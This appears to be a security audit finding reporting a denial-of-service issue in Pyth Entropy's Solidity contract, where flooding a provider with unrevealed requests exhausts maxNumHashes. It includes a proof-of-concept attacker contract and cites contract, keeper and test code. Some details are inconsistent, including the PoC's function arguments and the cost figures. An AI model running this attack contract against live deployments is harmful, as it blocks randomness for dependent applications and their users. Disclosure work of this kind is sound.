### Title
Entropy Provider `maxNumHashes` Exhaustion Enables Temporary DoS on New Randomness Requests — (`target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

An unprivileged attacker can exhaust a provider's `maxNumHashes` limit by submitting many randomness requests without ever revealing them. Once the outstanding-request gap exceeds `maxNumHashes`, every subsequent `request` / `requestWithCallback` / `requestV2` call reverts with `LastRevealedTooOld`, blocking all new randomness requests for that provider until the provider (or Fortuna keeper) calls `advanceProviderCommitment`.

---

### Finding Description

**Root cause — `requestHelper` in `Entropy.sol`:**

```solidity
req.numHashes = SafeCast.toUint32(
    assignedSequenceNumber -
        providerInfo.currentCommitmentSequenceNumber   // gap grows with each unrevealed request
);
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();          // blocks ALL new requests
}
```

`numHashes` equals `sequenceNumber − currentCommitmentSequenceNumber`. Every new request increments `sequenceNumber` by 1 while `currentCommitmentSequenceNumber` only advances when a reveal is processed. An attacker who submits `maxNumHashes` requests and never reveals them pushes the gap to `maxNumHashes + 1`, causing every subsequent request to revert.

**Attacker entry path (fully unprivileged):**

```
requestWithCallback(provider, userContribution, gasLimit)
  → requestHelper(...)
    → numHashes = sequenceNumber - currentCommitmentSequenceNumber
    → if numHashes > maxNumHashes → revert LastRevealedTooOld
```

**Mitigation path — `advanceProviderCommitment`:**

The provider (or Fortuna keeper) can call `advanceProviderCommitment` to advance `currentCommitmentSequenceNumber`, reducing `numHashes` for future requests. However, this function requires the provider to supply the correct hash-chain preimage, so only the provider (or Fortuna) can call it in practice.

**Race condition with Fortuna keeper:**

The Fortuna keeper (`apps/fortuna/src/keeper/commitment.rs`) polls every 30 seconds and triggers at a 95 % threshold:

```rust
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;
// ...
if outstanding_requests > threshold {
    // advance commitment
}
```

An attacker who monitors the keeper's transaction can front-run it: after the keeper advances the commitment, the attacker immediately submits the remaining 5 % of `maxNumHashes` requests in the same or next block, re-triggering the condition before legitimate users can submit new requests. The keeper's own log message acknowledges this risk:

```rust
tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack.");
```

**Cost model (analogous to Taiko's 500 TKO per day):**

| Parameter | Value |
|---|---|
| Requests needed per cycle | `maxNumHashes` |
| Cost per cycle | `maxNumHashes × fee` |
| Keeper response time | ~30 s + block confirmation |
| Attacker re-trigger cost | `0.05 × maxNumHashes × fee` |

If `maxNumHashes = 100` and the fee is $0.10, the attacker spends $0.50 per cycle to maintain the DoS.

---

### Impact Explanation

All new randomness requests to the targeted provider revert with `LastRevealedTooOld` for the duration of the attack. Any on-chain application relying on Pyth Entropy (NFT mints, gaming, lotteries, DeFi protocols using randomness for liquidation ordering, etc.) is unable to obtain new random numbers until the provider advances its commitment. User funds paid as fees for requests submitted during the DoS window are not refunded.

---

### Likelihood Explanation

- `maxNumHashes` is a provider-configurable parameter; providers are encouraged to set it to bound gas costs during reveal.
- The attacker only needs to pay the standard request fee per slot — no privileged access, no leaked keys.
- The Fortuna keeper's 30-second polling interval and 95 % threshold leave a window in which the attacker can re-exhaust the limit before the keeper's `advanceProviderCommitment` transaction is confirmed.
- The attack is detectable but not preventable by the keeper alone, because the attacker can front-run the keeper's mitigation transaction.

---

### Recommendation

1. **Enforce a per-address request rate limit** or require a minimum time between requests from the same address to raise the cost of bulk exhaustion.
2. **Allow `advanceProviderCommitment` to be called atomically with new requests** (e.g., in a single transaction), so the keeper can advance and immediately accept new requests without a front-runnable gap.
3. **Reduce the keeper's polling interval** and trigger threshold (e.g., 80 % instead of 95 %) to shrink the window the attacker can exploit.
4. **Consider refunding fees** for requests that cannot be fulfilled due to `LastRevealedTooOld`, so the attacker bears the full cost rather than legitimate users.

---

### Proof of Concept

```solidity
// Attacker contract
contract EntropyExhauster {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Step 1: exhaust maxNumHashes slots
    function exhaust(uint32 maxNumHashes) external payable {
        uint128 fee = entropy.getFee(provider);
        for (uint32 i = 0; i < maxNumHashes; i++) {
            // Pay fee, never reveal — numHashes gap grows by 1 each iteration
            entropy.requestWithCallback{value: fee}(
                provider,
                keccak256(abi.encodePacked(i, block.timestamp))
            );
        }
    }

    // Step 2: after keeper calls advanceProviderCommitment, immediately
    // re-exhaust the remaining 5% gap to re-trigger LastRevealedTooOld
    function reExhaust(uint32 remaining) external payable {
        uint128 fee = entropy.getFee(provider);
        for (uint32 i = 0; i < remaining; i++) {
            entropy.requestWithCallback{value: fee}(
                provider,
                keccak256(abi.encodePacked(i, block.number))
            );
        }
        // All subsequent legitimate requests now revert with LastRevealedTooOld
    }
}
```

After `exhaust()` completes, any call to `request*` for the targeted provider reverts:

```
EntropyErrors.LastRevealedTooOld()
```

This matches the `testLastRevealedTooOld` test already present in the test suite, confirming the reachable code path. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-231)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L247-256)
```text
        req.numHashes = SafeCast.toUint32(
            assignedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        if (
            providerInfo.maxNumHashes != 0 &&
            req.numHashes > providerInfo.maxNumHashes
        ) {
            revert EntropyErrors.LastRevealedTooOld();
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L443-484)
```text
    function advanceProviderCommitment(
        address provider,
        uint64 advancedSequenceNumber,
        bytes32 providerContribution
    ) public override {
        EntropyStructsV2.ProviderInfo storage providerInfo = _state.providers[
            provider
        ];
        if (
            advancedSequenceNumber <=
            providerInfo.currentCommitmentSequenceNumber
        ) revert EntropyErrors.UpdateTooOld();
        if (advancedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.AssertionFailure();

        uint32 numHashes = SafeCast.toUint32(
            advancedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        bytes32 providerCommitment = constructProviderCommitment(
            numHashes,
            providerContribution
        );

        if (providerCommitment != providerInfo.currentCommitment)
            revert EntropyErrors.IncorrectRevelation();

        providerInfo.currentCommitmentSequenceNumber = advancedSequenceNumber;
        providerInfo.currentCommitment = providerContribution;
        if (
            providerInfo.currentCommitmentSequenceNumber >=
            providerInfo.sequenceNumber
        ) {
            // This means the provider called the function with a sequence number that was not yet requested.
            // Providers should never do this and we consider such an implementation flawed.
            // Assuming this is landed on-chain it's better to bump the sequence number and never use that range
            // for future requests. Otherwise, someone can use the leaked revelation to derive favorable random numbers.
            providerInfo.sequenceNumber =
                providerInfo.currentCommitmentSequenceNumber +
                1;
        }
    }
```

**File:** target_chains/ethereum/entropy_sdk/solidity/EntropyErrors.sol (L41-43)
```text
    // The last random number revealed from the provider is too old. Therefore, too many hashes
    // are required for any new reveal. Please update the currentCommitment before making more requests.
    error LastRevealedTooOld();
```

**File:** apps/fortuna/src/keeper/commitment.rs (L14-16)
```rust
const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;

```

**File:** apps/fortuna/src/keeper/commitment.rs (L55-61)
```rust
    let threshold =
        ((provider_info.max_num_hashes as f64) * UPDATE_COMMITMENTS_THRESHOLD_FACTOR) as u64;
    let outstanding_requests =
        provider_info.sequence_number - provider_info.current_commitment_sequence_number;
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L1427-1438)
```text
    function testLastRevealedTooOld() public {
        for (uint256 i = 0; i < provider1MaxNumHashes; i++) {
            request(user1, provider1, 42, false);
        }
        assertRequestReverts(
            random.getFee(provider1),
            provider1,
            42,
            false,
            EntropyErrors.LastRevealedTooOld.selector
        );
    }
```
